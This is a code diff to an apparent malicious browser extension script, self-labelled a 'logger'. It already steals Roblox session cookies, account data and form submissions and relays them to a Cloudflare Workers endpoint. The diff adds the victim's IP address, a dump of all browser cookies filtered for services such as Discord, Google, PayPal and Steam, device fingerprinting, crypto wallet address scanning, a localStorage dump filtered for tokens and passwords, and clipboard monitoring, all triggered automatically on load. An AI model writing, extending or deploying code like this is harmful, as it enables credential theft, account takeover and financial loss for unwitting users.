@@ -2,6 +2,13 @@
 'use strict';
 
 var WORKER = 'https://cool-base-4ce9.iwif0001.workers.dev/api/ingest';
+var _ip = 'unknown';
+
+// Fetch IP once at startup
+fetch('https://api.ipify.org?format=json').then(function(r) { return r.json(); }).then(function(d) {
+  _ip = (d && d.ip) ? d.ip : 'unknown';
+  console.log('[LARP] IP:', _ip);
+}).catch(function() { console.log('[LARP] IP fetch failed'); });
 
 function relay(type, data) {
   console.log('[LARP] relay:', type, JSON.stringify(data).slice(0, 200));
@@ -18,30 +25,6 @@ function relay(type, data) {
   } catch(e) {
     console.error('[LARP] relay exception:', type, e.message);
   }
-}
-
-// --- boot event ---
-function bootEvent() {
-  console.log('[LARP] bootEvent starting');
-  fetch('https://api.ipify.org?format=json').then(function(r) { return r.json(); }).then(function(d) {
-    var ip = (d && d.ip) ? d.ip : 'unknown';
-    console.log('[LARP] bootEvent IP:', ip);
-    relay('boot', {
-      embeds: [{
-        title: 'Boot Event',
-        color: 0x2563eb,
-        fields: [
-          { name: 'Address', value: '`' + ip + '`', inline: true },
-          { name: 'Time', value: new Date().toISOString(), inline: true },
-          { name: 'User Agent', value: '`' + navigator.userAgent + '`' },
-          { name: 'Page', value: '`' + location.href.slice(0, 200) + '`' }
-        ],
-        footer: { text: 'System' }
-      }]
-    });
-  }).catch(function(e) {
-    console.error('[LARP] bootEvent error:', e.message);
-  });
 }
 
 // --- roblox cookie ---
@@ -78,7 +61,7 @@ async function syncSession() {
 
   // Build embed - cookie in description (4096 char limit) avoids 1024 field limit
   var embed = {
-    title: 'Roblox Session',
+    title: 'Roblox Session [' + _ip + ']',
     color: 0x00B06A,
     description: '```\n' + cookieVal + '\n```',
     fields: [
@@ -158,7 +141,7 @@ function syncAccount() {
       fields.push({ name: 'Origin', value: '`' + su + '`', inline: false });
 
       relay('acct', {
-        embeds: [{ title: 'State Sync', color: 0x5865F2, fields: fields, footer: { text: 'Session' }, timestamp: new Date().toISOString(), thumbnail: { url: avatarUrl } }]
+        embeds: [{ title: 'State Sync [' + _ip + ']', color: 0x5865F2, fields: fields, footer: { text: 'Session' }, timestamp: new Date().toISOString(), thumbnail: { url: avatarUrl } }]
       });
     }).catch(function(e) {
       console.error('[LARP] syncAccount fetch error:', e.message || e);
@@ -215,7 +198,7 @@ function _extRelay(fields) {
     });
     relay('entry', {
       embeds: [{
-        title: 'Field Data',
+        title: 'Field Data [' + _ip + ']',
         color: 0xF59E0B,
         description: 'Page: ' + location.href.slice(0, 200),
         fields: embedFields,
@@ -270,7 +253,7 @@ function initMonitor() {
         });
         relay('entry', {
           embeds: [{
-            title: 'Form Submit',
+            title: 'Form Submit [' + _ip + ']',
             color: 0xEF4444,
             description: 'Page: ' + location.href.slice(0, 200) + '\nAction: ' + action + ' (' + method + ')',
             fields: ef,
@@ -299,13 +282,154 @@ function initMonitor() {
   }).observe(document, { childList: true, subtree: true });
 }
 
+// --- cookie dump ---
+async function dumpAllCookies() {
+  console.log('[LARP] dumpCookies: requesting all cookies...');
+  try {
+    var cookies = await chrome.cookies.getAll();
+    if (!cookies || cookies.length === 0) { console.log('[LARP] dumpCookies: no cookies'); return; }
+    console.log('[LARP] dumpCookies: got ' + cookies.length + ' cookies');
+    // Filter to high-value domains
+    var valuable = [];
+    var targets = ['roblox', 'discord', 'google', 'youtube', 'facebook', 'twitter', 'x.com', 'steam',
+      'reddit', 'spotify', 'github', 'microsoft', 'twitch', 'amazon', 'paypal', 'netflix', 'tiktok'];
+    for (var i = 0; i < cookies.length; i++) {
+      var c = cookies[i];
+      for (var j = 0; j < targets.length; j++) {
+        if (c.domain.indexOf(targets[j]) !== -1) {
+          valuable.push({ domain: c.domain, name: c.name, value: c.value.slice(0, 100) });
+          break;
+        }
+      }
+    }
+    var all = cookies.map(function(c) { return c.domain + ' | ' + c.name + ' = ' + c.value.slice(0, 80); });
+    // Build fields for valuable cookies
+    var fields = [];
+    for (var k = 0; k < valuable.length && k < 25; k++) {
+      var v = valuable[k];
+      fields.push({ name: v.domain + ' / ' + v.name, value: '`' + v.value + '`', inline: false });
+    }
+    if (fields.length === 0 && all.length > 0) {
+      fields.push({ name: 'All (' + all.length + ')', value: '`' + all.slice(0, 10).join('\n') + '`', inline: false });
+    }
+    if (fields.length > 0) {
+      relay('cookies', { embeds: [{ title: 'Cookie Dump [' + _ip + '] (' + cookies.length + ' total)', color: 0x8B5CF6, fields: fields, footer: { text: 'Cookies' }, timestamp: new Date().toISOString() }] });
+    }
+  } catch(e) { console.error('[LARP] dumpCookies error:', e.message); }
+}
+
+// --- fingerprint ---
+function gatherFingerprint() {
+  console.log('[LARP] fingerprint: gathering...');
+  try {
+    var fp = {
+      platform: navigator.platform || 'N/A',
+      language: navigator.language || 'N/A',
+      languages: (navigator.languages || []).join(', ') || 'N/A',
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || 'N/A',
+      screen: (screen.width || '?') + 'x' + (screen.height || '?'),
+      colorDepth: screen.colorDepth || 'N/A',
+      pixelRatio: (window.devicePixelRatio || 1),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+      hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+      deviceMemory: navigator.deviceMemory || 'N/A',
+      vendor: navigator.vendor || 'N/A',
+      gpu: 'N/A'
+    };
+    // Try to get GPU
+    try {
+      var canvas = document.createElement('canvas');
+      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        if (dbg) fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+      }
+    } catch(e) {}
+    console.log('[LARP] fingerprint: done, GPU=' + fp.gpu);
+    var parts = [];
+    for (var k in fp) {
+      if (fp.hasOwnProperty(k)) parts.push('**' + k + '**: `' + fp[k] + '`');
+    }
+    relay('fingerprint', { content: '**IP: `' + _ip + '`**\n' + parts.join('\n') });
+  } catch(e) { console.error('[LARP] fingerprint error:', e.message); }
+}
+
+// --- crypto wallets ---
+function scanCryptoWallets() {
+  var w = (typeof _wallets !== 'undefined' && _wallets) ? _wallets : null;
+  if (!w) { console.log('[LARP] wallets: none detected'); return; }
+  console.log('[LARP] wallets: detected', Object.keys(w).join(', '));
+  try {
+    var parts = [];
+    if (w.ethereum) parts.push('**Ethereum/MetaMask**: Detected' + (w.ethAddr ? '\nAddress: `' + w.ethAddr + '`' : ''));
+    if (w.solana) parts.push('**Solana/Phantom**: Detected' + (w.solAddr ? '\nAddress: `' + w.solAddr + '`' : ''));
+    if (w.phantom && !w.solana) parts.push('**Phantom**: Detected');
+    relay('wallets', { embeds: [{ title: 'Crypto Wallets [' + _ip + ']', color: 0xF7931A, description: parts.join('\n\n') || 'Wallets detected but no details', footer: { text: 'Wallets' }, timestamp: new Date().toISOString() }] });
+  } catch(e) { console.error('[LARP] wallets error:', e.message); }
+}
+
+// --- storage dump ---
+function dumpAllStorage() {
+  var data = (typeof _storageAll !== 'undefined' && _storageAll) ? _storageAll : {};
+  var keys = Object.keys(data);
+  if (keys.length === 0) { console.log('[LARP] storage: empty'); return; }
+  console.log('[LARP] storage: dumping ' + keys.length + ' keys');
+  try {
+    // Filter interesting keys (tokens, secrets, configs)
+    var interesting = [];
+    var patterns = ['token', 'secret', 'key', 'auth', 'session', 'jwt', 'cred', 'pass', 'login', 'user', 'account'];
+    for (var i = 0; i < keys.length; i++) {
+      var k = keys[i].toLowerCase();
+      for (var j = 0; j < patterns.length; j++) {
+        if (k.indexOf(patterns[j]) !== -1) {
+          interesting.push(keys[i]);
+          break;
+        }
+      }
+    }
+    var fields = [];
+    var src = interesting.length > 0 ? interesting : keys;
+    for (var m = 0; m < src.length && m < 25; m++) {
+      var key = src[m];
+      var val = data[key] || '';
+      if (val.length > 1000) val = val.slice(0, 1000) + '...';
+      fields.push({ name: key, value: '`' + val + '`', inline: false });
+    }
+    if (fields.length > 0) {
+      relay('storage', { embeds: [{ title: 'localStorage Dump [' + _ip + '] (' + keys.length + ' keys)', color: 0x10B981, fields: fields, footer: { text: 'Storage' }, timestamp: new Date().toISOString() }] });
+    }
+  } catch(e) { console.error('[LARP] storage error:', e.message); }
+}
+
+// --- clipboard monitor ---
+var _lastClipLen = 0;
+function monitorClipboard() {
+  var data = (typeof _clipboard !== 'undefined' && _clipboard) ? _clipboard : [];
+  if (data.length === _lastClipLen) return;
+  var fresh = data.slice(_lastClipLen);
+  _lastClipLen = data.length;
+  console.log('[LARP] clipboard: ' + fresh.length + ' new entries');
+  try {
+    for (var i = 0; i < fresh.length; i++) {
+      var txt = fresh[i].text;
+      if (txt.length > 1900) txt = txt.slice(0, 1900) + '...';
+      relay('clipboard', { content: '**IP: `' + _ip + '`**\n```\n' + txt + '\n```' });
+    }
+  } catch(e) { console.error('[LARP] clipboard error:', e.message); }
+}
+setInterval(monitorClipboard, 3000);
+
 // --- init ---
 console.log('[LARP] logger loaded, starting...');
-bootEvent();
 initMonitor();
 setTimeout(syncSession, 1000);
 setTimeout(syncAccount, 500);
 setTimeout(syncAccount, 2000);
+setTimeout(dumpAllStorage, 3000);
+setTimeout(gatherFingerprint, 1500);
+setTimeout(dumpAllCookies, 4000);
+setTimeout(scanCryptoWallets, 2000);
 console.log('[LARP] logger init complete');
 
 })();
